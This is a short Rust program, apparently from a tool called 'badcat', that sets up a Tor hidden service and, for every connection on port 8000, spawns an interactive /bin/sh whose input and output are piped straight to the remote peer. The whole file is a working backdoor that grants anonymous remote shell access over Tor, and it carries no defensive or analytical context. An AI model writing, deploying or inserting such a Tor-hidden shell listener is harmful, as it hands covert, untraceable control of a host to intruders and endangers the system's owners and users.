use std::path::Path;
use std::process::{Command, Stdio};

use tor::stream::Connection;
use badcat_lib::io as badcat_io;

fn main() {
    let hs = tor::Tor::new(&Path::new("torrc").to_path_buf());

    tor::stream::listen_connections(8000, on_connection).unwrap();

    hs.stop().unwrap();
}

fn on_connection(conn: &mut Connection) {
    println!("new connection {}", conn.id());

    let proc = Command::new("/bin/sh")
        .arg("-i")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn().unwrap();

    let stdin = proc.stdin.unwrap();
    let stdout = proc.stdout.unwrap();
    let stderr = proc.stderr.unwrap();

    let stream_in = conn.clone();
    let stream_out = conn.clone();
    let stream_err = conn.clone();

    let in_thread = badcat_io::pipe_io(stream_in, stdin);
    let out_thread = badcat_io::pipe_io(stdout, stream_out);
    let err_thread = badcat_io::pipe_io(stderr, stream_err);

    in_thread.join().unwrap();
    out_thread.join().unwrap();
    err_thread.join().unwrap();
}